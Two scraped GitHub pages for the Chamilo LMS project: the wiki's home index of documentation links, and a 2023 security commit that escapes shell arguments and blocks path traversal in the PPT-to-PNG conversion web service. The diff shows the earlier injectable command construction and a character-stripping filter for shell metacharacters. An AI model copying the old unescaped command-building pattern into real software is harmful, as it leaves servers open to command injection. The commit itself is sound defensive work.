=== Content from support.chamilo.org_1bcc3a40_20250114_223427.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fwiki)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fwiki)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fwiki%2Findex&source=header-repo&source_repo=chamilo%2Fchamilo-lms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[chamilo](/chamilo)
/
**[chamilo-lms](/chamilo/chamilo-lms)**
Public

* [Notifications](/login?return_to=%2Fchamilo%2Fchamilo-lms) You must be signed in to change notification settings
* [Fork
  487](/login?return_to=%2Fchamilo%2Fchamilo-lms)
* [Star
   821](/login?return_to=%2Fchamilo%2Fchamilo-lms)

* [Code](/chamilo/chamilo-lms)
* [Issues
  568](/chamilo/chamilo-lms/issues)
* [Pull requests
  30](/chamilo/chamilo-lms/pulls)
* [Discussions](/chamilo/chamilo-lms/discussions)
* [Actions](/chamilo/chamilo-lms/actions)
* [Projects
  0](/chamilo/chamilo-lms/projects)
* [Wiki](/chamilo/chamilo-lms/wiki)
* [Security](/chamilo/chamilo-lms/security)
* [Insights](/chamilo/chamilo-lms/pulse)

Additional navigation options

* [Code](/chamilo/chamilo-lms)
* [Issues](/chamilo/chamilo-lms/issues)
* [Pull requests](/chamilo/chamilo-lms/pulls)
* [Discussions](/chamilo/chamilo-lms/discussions)
* [Actions](/chamilo/chamilo-lms/actions)
* [Projects](/chamilo/chamilo-lms/projects)
* [Wiki](/chamilo/chamilo-lms/wiki)
* [Security](/chamilo/chamilo-lms/security)
* [Insights](/chamilo/chamilo-lms/pulse)

# Home

[Jump to bottom](#wiki-pages-box)
 [Edit](/chamilo/chamilo-lms/wiki/Home/_edit)
 [New page](/chamilo/chamilo-lms/wiki/_new)

Yannick Warnier edited this page Dec 19, 2024
·
[56 revisions](/chamilo/chamilo-lms/wiki/Home/_history)

Welcome to the chamilo-lms wiki!

Chamilo LMS is, as of 2018, one of the 3 top Open Source LMS worldwide and one of the top 8 LMS in use for Higher Education worldwide, as reported by [ListEdTech](http://listedtech.com/lms-coverage-two-year-anniversary/).

This is the technical wiki of Chamilo, meaning if you're looking for more user-side documentation, you should either be looking at [Chamilo's website](https://chamilo.org) or its online documentation (see below).

## Essentials

* [Chamilo Teacher, Admin and Developers guides](https://docs.chamilo.org)
* Chamilo's [Installation guide](https://11.chamilo.org/documentation/installation_guide.html) for versions 1.11.\*
* [How to report issues](/chamilo/chamilo-lms/wiki/How-to-report-issues) also [in French](https://github.com/chamilo/chamilo-lms/wiki/Comment-rapporter-une-erreur) or [in Spanish](https://github.com/chamilo/chamilo-lms/wiki/Como-reportar-errores)
* [Chamilo Development Principles](/chamilo/chamilo-lms/wiki/Chamilo-Development-Principles)
* [Chamilo Developer's Starting Guide for v1.\*](/chamilo/chamilo-lms/wiki/Chamilo-Developer%27s-Starting-Guide-for-v1.%2A)
* [Secure Development Policy](/chamilo/chamilo-lms/wiki/Secure-Development-Policy)
* [Security Issues](/chamilo/chamilo-lms/wiki/security-issues)

### Chamilo 1.\*

* [Coding conventions](/chamilo/chamilo-lms/wiki/Coding-conventions)
* [Database structure](/chamilo/chamilo-lms/wiki/Database-structure)
* [Extra fields dictionary v1](/chamilo/chamilo-lms/wiki/Extra-fields-dictionary-v1)
* [Import from Moodle](/chamilo/chamilo-lms/wiki/Import-from-Moodle)
* [Password Management](/chamilo/chamilo-lms/wiki/Password-Management)
* [Quiz features dictionary v1](/chamilo/chamilo-lms/wiki/Quiz-features-dictionary-v1)
* [Reports dictionary](/chamilo/chamilo-lms/wiki/Reports-dictionary)
* [Security issues and reporting procedure](https://support.chamilo.org/projects/chamilo-18/wiki/Security_issues)
* [Session expiry time](/chamilo/chamilo-lms/wiki/Session-expiry-time)
* [Web services](wiki/webservices)

### Chamilo 2.\*

* [Authentication methods](/chamilo/chamilo-lms/wiki/authentication.yaml)
* [Clean-up choices for v1 to v2](/chamilo/chamilo-lms/wiki/Clean-up-choices-for-v1-to-v2)
* [Converting legacy SQL](/chamilo/chamilo-lms/wiki/Converting-legacy-SQL)
* [Code quality checkers](/chamilo/chamilo-lms/wiki/Code-quality-checkers)
* [Code annotation types](/chamilo/chamilo-lms/wiki/Code-annotation-types)
* [Coding conventions v2](/chamilo/chamilo-lms/wiki/Coding-conventions-v2)
* [Configurations](/chamilo/chamilo-lms/wiki/Configurations)
* [Graphical design guide](/chamilo/chamilo-lms/wiki/Graphical-design-guide)
* [Internationalization](/chamilo/chamilo-lms/wiki/Internationalization)
* [Technical design decisions](/chamilo/chamilo-lms/wiki/Technical-design-decisions)
* [Message queue](/chamilo/chamilo-lms/wiki/Message-queue), emails, etc
* [Password Management 2](/chamilo/chamilo-lms/wiki/Password-Management-2)
* [Permissions](/chamilo/chamilo-lms/wiki/Permissions)

#### Procedures

* [c\_item\_property to nodes conversion](/chamilo/chamilo-lms/wiki/c_item_property-to-nodes-conversion)
* [Adding page types](/chamilo/chamilo-lms/wiki/Adding-page-types) (CMS feature)

## Extra

* [Supported versions](/chamilo/chamilo-lms/wiki/Supported-versions)
* [Release procedure](/chamilo/chamilo-lms/wiki/Release-procedure)
* [Release cycle](/chamilo/chamilo-lms/wiki/Release-cycle)
* [Translations management](/chamilo/chamilo-lms/wiki/Translations-management)
* [Community support strategy](/chamilo/chamilo-lms/wiki/Community-support-strategy)
* [Tools and sessions](/chamilo/chamilo-lms/wiki/Tools-and-sessions)
* [Visual design](/chamilo/chamilo-lms/wiki/visuals)
* [(near) Real Time Communications](/chamilo/chamilo-lms/wiki/RTC)
* [Common Cartridge](/chamilo/chamilo-lms/wiki/Common-Cartridge) support

## Policies

* [Privacy Policy](/chamilo/chamilo-lms/wiki/Privacy-Policy) of the Chamilo software
* [Cookie Policy](/chamilo/chamilo-lms/wiki/Cookie-Policy) of the Chamilo software

The main wiki for the Chamilo LMS project is now here. Our wiki was previously kept on a separate tracking system: <https://support.chamilo.org/projects/chamilo-18/wiki>. Use it for legacy references, like tasks references in this form "CT#1234"

[Add a custom footer](/chamilo/chamilo-lms/wiki/_new?wiki%5Bname%5D=_Footer)

### Toggle table of contents Pages 60

* Loading

  [Home](/chamilo/chamilo-lms/wiki)

  + [Essentials](/chamilo/chamilo-lms/wiki#essentials)
  + [Chamilo 1.\*](/chamilo/chamilo-lms/wiki#chamilo-1)
  + [Chamilo 2.\*](/chamilo/chamilo-lms/wiki#chamilo-2)
  + [Procedures](/chamilo/chamilo-lms/wiki#procedures)
  + [Extra](/chamilo/chamilo-lms/wiki#extra)
  + [Policies](/chamilo/chamilo-lms/wiki#policies)
* Loading

  [1.11 data dictionary](/chamilo/chamilo-lms/wiki/1.11-data-dictionary)
* Loading

  [2.0 data dictionary](/chamilo/chamilo-lms/wiki/2.0-data-dictionary)
* Loading

  [Add a new Chamilo setting](/chamilo/chamilo-lms/wiki/Add-a-new-Chamilo-setting)
* Loading

  [Adding page types](/chamilo/chamilo-lms/wiki/Adding-page-types)
* Loading

  [authentication.yaml](/chamilo/chamilo-lms/wiki/authentication.yaml)
* Loading

  [c\_item\_property to nodes conversion](/chamilo/chamilo-lms/wiki/c_item_property-to-nodes-conversion)
* Loading

  [Chamilo APIs](/chamilo/chamilo-lms/wiki/Chamilo-APIs)
* Loading

  [Chamilo Developer's Starting Guide for v1.\*](/chamilo/chamilo-lms/wiki/Chamilo-Developer%27s-Starting-Guide-for-v1.%2A)
* Loading

  [Chamilo Development Principles](/chamilo/chamilo-lms/wiki/Chamilo-Development-Principles)
* Loading

  [Clean up choices for v1 to v2](/chamilo/chamilo-lms/wiki/Clean-up-choices-for-v1-to-v2)
* Loading

  [Code annotation types](/chamilo/chamilo-lms/wiki/Code-annotation-types)
* Loading

  [Code quality checkers](/chamilo/chamilo-lms/wiki/Code-quality-checkers)
* Loading

  [Coding conventions](/chamilo/chamilo-lms/wiki/Coding-conventions)
* Loading

  [Coding conventions v2](/chamilo/chamilo-lms/wiki/Coding-conventions-v2)
* Loading

  [Comment rapporter une erreur](/chamilo/chamilo-lms/wiki/Comment-rapporter-une-erreur)
* Loading

  [Common Cartridge](/chamilo/chamilo-lms/wiki/Common-Cartridge)
* Loading

  [Community support strategy](/chamilo/chamilo-lms/wiki/Community-support-strategy)
* Loading

  [Como reportar errores](/chamilo/chamilo-lms/wiki/Como-reportar-errores)
* Loading

  [Configurations](/chamilo/chamilo-lms/wiki/Configurations)
* Loading

  [Converting legacy SQL](/chamilo/chamilo-lms/wiki/Converting-legacy-SQL)
* Loading

  [Cookie Policy](/chamilo/chamilo-lms/wiki/Cookie-Policy)
* Loading

  [Database structure](/chamilo/chamilo-lms/wiki/Database-structure)
* Loading

  [Date and time management](/chamilo/chamilo-lms/wiki/Date-and-time-management)
* Loading

  [Error when creating a course](/chamilo/chamilo-lms/wiki/Error-when-creating-a-course)
* Loading

  [este error me sale cuando quiero poner una foto en mi perfil](/chamilo/chamilo-lms/wiki/este-error-me-sale-cuando-quiero-poner-una-foto-en-mi-perfil)
* Loading

  [Estrategia de soporte comunitario](/chamilo/chamilo-lms/wiki/Estrategia-de-soporte-comunitario)
* Loading

  [Extra fields dictionary v1](/chamilo/chamilo-lms/wiki/Extra-fields-dictionary-v1)
* Loading

  [Graphical design guide](/chamilo/chamilo-lms/wiki/Graphical-design-guide)
* Loading

  [GraphQL API API v3](/chamilo/chamilo-lms/wiki/GraphQL-API---API-v3)
* Loading

  [How to report issues](/chamilo/chamilo-lms/wiki/How-to-report-issues)
* Loading

  [Import from Moodle](/chamilo/chamilo-lms/wiki/Import-from-Moodle)
* Loading

  [Importing IMS QTI](/chamilo/chamilo-lms/wiki/Importing-IMS-QTI)
* Loading

  [Internationalization](/chamilo/chamilo-lms/wiki/Internationalization)
* Loading

  [Learning objects management](/chamilo/chamilo-lms/wiki/Learning-objects-management)
* Loading

  [Message queue](/chamilo/chamilo-lms/wiki/Message-queue)
* Loading

  [Moodle Exporter](/chamilo/chamilo-lms/wiki/Moodle-Exporter)
* Loading

  [Password Management](/chamilo/chamilo-lms/wiki/Password-Management)
* Loading

  [Password Management 2](/chamilo/chamilo-lms/wiki/Password-Management-2)
* Loading

  [Permissions](/chamilo/chamilo-lms/wiki/Permissions)
* Loading

  [Privacy Policy](/chamilo/chamilo-lms/wiki/Privacy-Policy)
* Loading

  [Quiz features dictionary v1](/chamilo/chamilo-lms/wiki/Quiz-features-dictionary-v1)
* Loading

  [Release cycle](/chamilo/chamilo-lms/wiki/Release-cycle)
* Loading

  [Release procedure](/chamilo/chamilo-lms/wiki/Release-procedure)
* Loading

  [Reports dictionary](/chamilo/chamilo-lms/wiki/Reports-dictionary)
* Loading

  [Rest WebServices](/chamilo/chamilo-lms/wiki/Rest-WebServices)
* Loading

  [RTC](/chamilo/chamilo-lms/wiki/RTC)
* Loading

  [Secure Development Policy](/chamilo/chamilo-lms/wiki/Secure-Development-Policy)
* Loading

  [security issues](/chamilo/chamilo-lms/wiki/security-issues)
* Loading

  [Session expiry time](/chamilo/chamilo-lms/wiki/Session-expiry-time)
* Loading

  [Settings migration from 1 to 2](/chamilo/chamilo-lms/wiki/Settings-migration-from-1-to-2)
* Loading

  [Supported versions](/chamilo/chamilo-lms/wiki/Supported-versions)
* Loading

  [Technical design decisions](/chamilo/chamilo-lms/wiki/Technical-design-decisions)
* Loading

  [Tools and sessions](/chamilo/chamilo-lms/wiki/Tools-and-sessions)
* Loading

  [Translations management](/chamilo/chamilo-lms/wiki/Translations-management)
* Loading

  [Visual design](/chamilo/chamilo-lms/wiki/Visual-design)
* Loading

  [visuals](/chamilo/chamilo-lms/wiki/visuals)
* Loading

  [webservices](/chamilo/chamilo-lms/wiki/webservices)
* Loading

  [webservices api latest](/chamilo/chamilo-lms/wiki/webservices-api-latest)
* Loading

  [xAPI](/chamilo/chamilo-lms/wiki/xAPI)
* Show 45 more pages…

![Chamilo LMS](https://camo.githubusercontent.com/72f8fa6ebdb4427d1500ae718e03fa926d3afe1173b766c18aedafb910f2f2dd/68747470733a2f2f6368616d696c6f2e6f72672f77702d636f6e74656e742f75706c6f6164732f323031382f30392f6368616d696c6f5f6c6f676f2e706e67)

* [Home](https://github.com/chamilo/chamilo-lms/wiki)
  + [Tools and sessions](https://github.com/chamilo/chamilo-lms/wiki/Tools-and-sessions)
  + Quiz: Importing
    - [IMS/QTI](https://github.com/chamilo/chamilo-lms/wiki/Importing-ims-qti)
* Releases
  + [Supported versions](https://github.com/chamilo/chamilo-lms/wiki/Supported-versions)
  + [Release cycle](https://github.com/chamilo/chamilo-lms/wiki/Release-cycle)
  + [Release procedure](https://github.com/chamilo/chamilo-lms/wiki/Release-procedure)
* [Community support strategy](https://github.com/chamilo/chamilo-lms/wiki/Community-support-strategy)
  + [Estrategia de soporte comunitario](https://github.com/chamilo/chamilo-lms/wiki/Estrategia-de-soporte-comunitario)
* [Translation management](https://github.com/chamilo/chamilo-lms/wiki/Translations-management)
* [How to report issues](https://github.com/chamilo/chamilo-lms/wiki/How-to-report-issues)
  + [Comment rapporter une erreur](https://github.com/chamilo/chamilo-lms/wiki/Comment-rapporter-une-erreur)
  + [Cómo reportar errores](https://github.com/chamilo/chamilo-lms/wiki/Como-reportar-errores)
* Development
  + [Coding conventions](https://github.com/chamilo/chamilo-lms/wiki/Coding-conventions)
  + [Add a new Chamilo setting](https://github.com/chamilo/chamilo-lms/wiki/Add-a-new-Chamilo-setting)
  + [Database structure](https://github.com/chamilo/chamilo-lms/wiki/Database-structure)
  + [Date and time management](https://github.com/chamilo/chamilo-lms/wiki/Date-and-time-management)
* Integration
  + [Chamilo APIs](https://github.com/chamilo/chamilo-lms/wiki/Chamilo-APIs)
    - [Rest WebServices](https://github.com/chamilo/chamilo-lms/wiki/Rest-WebServices)
    - [GraphQL API / API v3](https://github.com/chamilo/chamilo-lms/wiki/GraphQL-API---API-v3)

##### Clone this wiki locally

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_09a6305a_20250114_223426.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fcommit%2F37be9ce7243a30259047dd4517c48ff8b21d657a)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fcommit%2F37be9ce7243a30259047dd4517c48ff8b21d657a)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=chamilo%2Fchamilo-lms)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[chamilo](/chamilo)
/
**[chamilo-lms](/chamilo/chamilo-lms)**
Public

* [Notifications](/login?return_to=%2Fchamilo%2Fchamilo-lms) You must be signed in to change notification settings
* [Fork
  487](/login?return_to=%2Fchamilo%2Fchamilo-lms)
* [Star
   821](/login?return_to=%2Fchamilo%2Fchamilo-lms)

* [Code](/chamilo/chamilo-lms)
* [Issues
  568](/chamilo/chamilo-lms/issues)
* [Pull requests
  30](/chamilo/chamilo-lms/pulls)
* [Discussions](/chamilo/chamilo-lms/discussions)
* [Actions](/chamilo/chamilo-lms/actions)
* [Projects
  0](/chamilo/chamilo-lms/projects)
* [Wiki](/chamilo/chamilo-lms/wiki)
* [Security](/chamilo/chamilo-lms/security)
* [Insights](/chamilo/chamilo-lms/pulse)

Additional navigation options

* [Code](/chamilo/chamilo-lms)
* [Issues](/chamilo/chamilo-lms/issues)
* [Pull requests](/chamilo/chamilo-lms/pulls)
* [Discussions](/chamilo/chamilo-lms/discussions)
* [Actions](/chamilo/chamilo-lms/actions)
* [Projects](/chamilo/chamilo-lms/projects)
* [Wiki](/chamilo/chamilo-lms/wiki)
* [Security](/chamilo/chamilo-lms/security)
* [Insights](/chamilo/chamilo-lms/pulse)

## Commit

[Permalink](/chamilo/chamilo-lms/commit/37be9ce7243a30259047dd4517c48ff8b21d657a)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Security: Avoid relative path traversal to execute ppt2png and escape…

[Browse files](/chamilo/chamilo-lms/tree/37be9ce7243a30259047dd4517c48ff8b21d657a)
Browse the repository at this point in the history

```
… shell command used to execute PPT converter
```

* Loading branch information

[![@AngelFQC](https://avatars.githubusercontent.com/u/1697880?s=40&v=4)](/AngelFQC)

[AngelFQC](/chamilo/chamilo-lms/commits?author=AngelFQC "View all commits by AngelFQC")
authored
Jul 17, 2023

1 parent
[0ced3ed](/chamilo/chamilo-lms/commit/0ced3edd3bf6f23e1e83ff8ab1e89ca6793dc06b)

commit 37be9ce

 Show file tree

 Hide file tree

Showing
**2 changed files**
with
**29 additions**
and
**9 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* main

  + inc/lib

    - main/inc/lib/security.lib.php
      [security.lib.php](#diff-96c3f8c89e0b312229186133ae7e9f2516f1b4165a21d6c219702f880eabe752)
  + webservices

    - main/webservices/additional\_webservices.php
      [additional\_webservices.php](#diff-0285e7f8534c6d5c740d221982a7395a7c97e23fa52701449abb2f8a17d89df5)

## There are no files selected for viewing

4 changes: 3 additions & 1 deletion

4
[main/inc/lib/security.lib.php](#diff-96c3f8c89e0b312229186133ae7e9f2516f1b4165a21d6c219702f880eabe752 "main/inc/lib/security.lib.php")

Show comments

[View file](/chamilo/chamilo-lms/blob/37be9ce7243a30259047dd4517c48ff8b21d657a/main/inc/lib/security.lib.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -632,7 +632,9 @@ public static function getPasswordRequirementsToString(array $evaluatedCondition |
|  |  | \*/ |
|  |  | public static function sanitizeExecParam(string $param): string |
|  |  | { |
|  |  | return preg\_replace('/[`;&|]/', '', $param); |
|  |  | $param = preg\_replace('/[`;&|]/', '', $param); |
|  |  |  |
|  |  | return escapeshellarg($param); |
|  |  | } |
|  |  |  |
|  |  | private static function generateSecTokenVariable(string $prefix = ''): string |
| Expand Down | |  |

34 changes: 26 additions & 8 deletions

34
[main/webservices/additional\_webservices.php](#diff-0285e7f8534c6d5c740d221982a7395a7c97e23fa52701449abb2f8a17d89df5 "main/webservices/additional_webservices.php")

Show comments

[View file](/chamilo/chamilo-lms/blob/37be9ce7243a30259047dd4517c48ff8b21d657a/main/webservices/additional_webservices.php)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -30,18 +30,26 @@ function wsConvertPpt($pptData) |
|  |  | } |
|  |  | $fileData = $pptData['file\_data']; |
|  |  | // Clean filename to avoid hacks. Prevents "&" and ";" to be used in filename, notably |
|  |  | $sanitizedFileName = Security::sanitizeExecParam($pptData['file\_name']); |
|  |  |  |
|  |  | if (strpos($pptData['file\_name'], '..') !== false) { |
|  |  | return false; |
|  |  | } |
|  |  |  |
|  |  | $sanitizedFileName = $pptData['file\_name']; |
|  |  | $dataInfo = pathinfo($sanitizedFileName); |
|  |  | $fileName = basename($sanitizedFileName, '.'.$dataInfo['extension']); |
|  |  | // Add additional cleaning of .php and .htaccess files |
|  |  | $fullFileName = Security::filter\_filename($sanitizedFileName); |
|  |  | $size = Security::sanitizeExecParam($pptData['service\_ppt2lp\_size']); |
|  |  | $size = $pptData['service\_ppt2lp\_size']; |
|  |  | $w = '800'; |
|  |  | $h = '600'; |
|  |  | if (!empty($size)) { |
|  |  | list($w, $h) = explode('x', $size); |
|  |  | } |
|  |  |  |
|  |  | $w = (int) $w; |
|  |  | $h = (int) $h; |
|  |  |  |
|  |  | $tempArchivePath = api\_get\_path(SYS\_ARCHIVE\_PATH); |
|  |  | $tempPath = $tempArchivePath.'wsConvert/'.$fileName.'/'; |
|  |  | $tempPathNewFiles = $tempArchivePath.'wsConvert/'.$fileName.'-n/'; |
| Expand All | | @@ -56,8 +64,12 @@ function wsConvertPpt($pptData) |
|  |  | $file = base64\_decode($fileData); |
|  |  | file\_put\_contents($tempPath.$fullFileName, $file); |
|  |  |  |
|  |  | $cmd = pptConverterGetCommandBaseParams(); |
|  |  | $cmd .= ' -w '.$w.' -h '.$h.' -d oogie "'.$tempPath.$fullFileName.'" "'.$tempPathNewFiles.$fileName.'.html"'; |
|  |  | $cmd = pptConverterGetCommandBaseParams( |
|  |  | $w, |
|  |  | $h, |
|  |  | $tempPath.$fullFileName, |
|  |  | $tempPathNewFiles.$fileName.'.html' |
|  |  | ); |
|  |  |  |
|  |  | //$perms = api\_get\_permissions\_for\_new\_files(); |
|  |  | chmod($tempPathNewFiles.$fileName, $perms); |
| Expand Down  Expand Up | | @@ -137,21 +149,27 @@ function pptConverterDirectoriesCreate($tempPath, $tempPathNewFiles, $fileName, |
|  |  | \* |
|  |  | \* @return string $cmd |
|  |  | \*/ |
|  |  | function pptConverterGetCommandBaseParams() |
|  |  | function pptConverterGetCommandBaseParams(int $w, int $h, string $inputPath, string $outputPath) |
|  |  | { |
|  |  | $cd = ''; |
|  |  |  |
|  |  | if (IS\_WINDOWS\_OS) { // IS\_WINDOWS\_OS has been defined in main\_api.lib.php |
|  |  | $converterPath = str\_replace('/', '\\', api\_get\_path(SYS\_PATH).'main/inc/lib/ppt2png'); |
|  |  | $classPath = $converterPath.';'.$converterPath.'/jodconverter-2.2.2.jar;'.$converterPath.'/jodconverter-cli-2.2.2.jar'; |
|  |  | $cmd = 'java -Dfile.encoding=UTF-8 -cp "'.$classPath.'" DokeosConverter'; |
|  |  | $cmd = 'java -Dfile.encoding=UTF-8 -cp "'.$classPath.'"'; |
|  |  | } else { |
|  |  | $converterPath = api\_get\_path(SYS\_PATH).'main/inc/lib/ppt2png'; |
|  |  | $classPath = ' -Dfile.encoding=UTF-8 -cp .:jodconverter-2.2.2.jar:jodconverter-cli-2.2.2.jar'; |
|  |  | $cmd = 'cd '.$converterPath.' && java '.$classPath.' DokeosConverter'; |
|  |  | $cd = 'cd '.$converterPath.' && '; |
|  |  | $cmd = 'java '.$classPath; |
|  |  | } |
|  |  |  |
|  |  | $cmd .= ' DokeosConverter'; |
|  |  | $cmd .= ' -p '.api\_get\_setting('service\_ppt2lp', 'port'); |
|  |  | $cmd .= ' -w '.$w.' -h '.$h; |
|  |  | $cmd .= ' -d oogie '.Security::sanitizeExecParam($inputPath).' '.Security::sanitizeExecParam($outputPath); |
|  |  |  |
|  |  | return $cmd; |
|  |  | return $cd.escapeshellcmd($cmd); |
|  |  | } |
|  |  |  |
|  |  | $uri = api\_get\_path(WEB\_CODE\_PATH).'webservices/'; |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `37be9ce`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fchamilo%2Fchamilo-lms%2Fcommit%2F37be9ce7243a30259047dd4517c48ff8b21d657a) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
